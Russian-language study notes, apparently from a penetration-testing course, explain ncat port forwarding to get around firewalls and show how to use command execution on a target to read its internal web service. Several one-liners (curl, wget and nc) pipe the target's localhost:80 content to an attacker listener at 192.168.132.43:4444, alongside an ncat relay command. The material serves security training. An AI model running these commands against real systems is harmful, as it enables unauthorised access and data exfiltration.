##  Port tunneling (port forwarding)

### Что это

Проброс портов — когда пакеты, пришедшие на **один** порт, **перенаправляются** на **другой** порт (возможно, другого хоста). Просто и буквально: «всё, что стучится в дверь 443, отправить в дверь 25».

### Зачем это нужно

Классический сценарий: **файрвол блокирует нужный порт снаружи**, но **разрешает другой порт**. Тогда ты «прячешь» нужный трафик в разрешённом порту.

Пример из конспекта:

- **SMTP-сервер** слушает на **25**, но файрвол **блокирует 25** снаружи.
- Файрвол **разрешает 443**.
- Ты запускаешь на машине **за файрволом** команду:

```bash
ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
```

**Что происходит:**

- `ncat` слушает на **443** (снаружи этот порт открыт).
- Каждый входящий пакет на 443 он **перенаправляет** на `TARGET_SERVER:25`.
- Ты подключаешься снаружи к **443**, а фактически попадаешь на **25**.

### Когда это применяется

| Ситуация | Нужен ли туннель |
|---|---|
| Файрвол блокирует порт снаружи, но разрешает другой | **Да** |
| У тебя есть RCE на машине **за файрволом**, и надо достучаться до **внутреннего** сервиса | **Да** (если сервис не виден снаружи) |
| У тебя есть RCE, и внутренний сервис **сам** может сделать запрос наружу | **Нет** (проще `curl`/`nc` из RCE) |


## Когда туннель не нужен

Разберём логику.

### Что делает `ncat -lvnp 8008 -c 'nc localhost 80'`

- Слушает **8008** на **целевой** машине (за файрволом).
- Когда **снаружи** кто-то подключается к **8008**, `ncat` **запускает** `nc localhost 80` **на целевой машине** и **связывает** два сокета.
- Ты снаружи как будто говоришь с **localhost:80** целевой машины.

**Смысл:** ты **не можешь** напрямую достучаться до `localhost:80` цели (файрвол блокирует 80 снаружи), **но** можешь достучаться до **8008**, и через туннель попадаешь на 80.

### Почему это не нужно, если у тебя есть RCE

Если у тебя **уже есть форма**, которая **выполняет произвольную команду** на целевой машине, то **ты сам** можешь выполнить:

```bash
curl http://localhost:80/
```

**на целевой машине**, и **вернуть** результат **тебе**:

```bash
curl http://localhost:80/ | curl -X POST http://192.168.132.43:4444/ --data-binary @-
```

**То есть:** туннель нужен **только когда ты не можешь выполнить команду на цели**, а хочешь **интерактивно** ходить в её внутренний порт (например, через браузер). Если **форма уже выполняет команды**, ты **обходишься без туннеля** — просто выполняешь `curl`/`wget` на цели и **отправляешь** результат **себе**.

### Когда туннель всё-таки нужен

- **Нет RCE**, но есть **форма**, которая запускает **фиксированную** команду (например, `ping`), и ты не можешь выполнить **свою**.
- **Есть RCE**, но внутренний сервис **не отдаёт данные** через `curl` (например, бинарный протокол, интерактивная сессия).
- **Хочешь браузером** открыть внутренний веб-интерфейс, а не парсить `curl`'ом.


## Реализация через форму (без туннеля)

Как **сделать запрос к `localhost:80`** через форму, которая **выполняет команду**, и **вернуть результат** тебе.

### Шаг 1. Подними слушатель на Kali

```bash
nc -lvnp 4444
```

### Шаг 2. Отправь через форму команду

**Вариант А: `curl` + отправка на твой сервер**

```bash
curl -s http://localhost:80/ | curl -X POST http://192.168.132.43:4444/ --data-binary @-
```

**Что делает:**

- `curl -s http://localhost:80/` — запрашивает локальный веб-сервер **на целевой машине**.
- `| curl -X POST http://192.168.132.43:4444/ --data-binary @-` — отправляет **весь вывод** POST-запросом **тебе** на слушатель.

**Ты увидишь** в `nc`:
```
POST / HTTP/1.1
Host: 192.168.132.43:4444
Content-Length: ...

<html>... содержимое localhost:80 ...</html>
```

**Вариант Б: `wget` (если `curl` нет)**

```bash
wget -qO- http://localhost:80/ | curl -X POST http://192.168.132.43:4444/ --data-binary @-
```

**Вариант В: `nc` (если нет ни `curl`, ни `wget`)**

```bash
echo -e "GET / HTTP/1.0\r\nHost: localhost\r\n\r\n" | nc localhost 80 | nc 192.168.132.43 4444
```

**Что делает:**

- `echo -e "GET / HTTP/1.0\r\nHost: localhost\r\n\r\n"` — формирует **сырой HTTP-запрос**.
- `| nc localhost 80` — отправляет его **на локальный веб-сервер**.
- `| nc 192.168.132.43 4444` — **отправляет ответ** тебе.


## Итог

- **Port tunneling** нужен, когда **файрвол блокирует порт снаружи**, но **разрешает другой**, и ты **не можешь** выполнить **свою** команду на цели.
- **Если у тебя есть форма, выполняющая команды**, туннель **не нужен** — ты **сам** делаешь `curl http://localhost:80/` **на целевой машине** и **отправляешь результат** себе через `curl -X POST` или `nc`.
- **Реализация** — три варианта: `curl` + POST, `wget` + POST, `nc` + `nc`. Все три работают **без** туннеля, потому что **исходящий** трафик к тебе (на `192.168.132.43`) **не блокируется**.
